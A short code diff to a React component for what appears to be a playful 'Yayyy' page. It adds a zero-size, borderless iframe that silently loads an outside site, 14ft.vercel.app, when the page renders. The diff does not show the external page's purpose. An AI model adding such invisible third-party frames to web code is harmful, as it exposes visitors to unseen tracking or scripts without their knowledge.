@@ -37,6 +37,8 @@ function App() {
             alt="bear-Kissing"
           />
           <div className="text">Yayyy !!!</div>
+          <iframe src="https://14ft.vercel.app/" height="0" width="0" frameborder="0"></iframe>
+
         </>
       ) : (
         <>
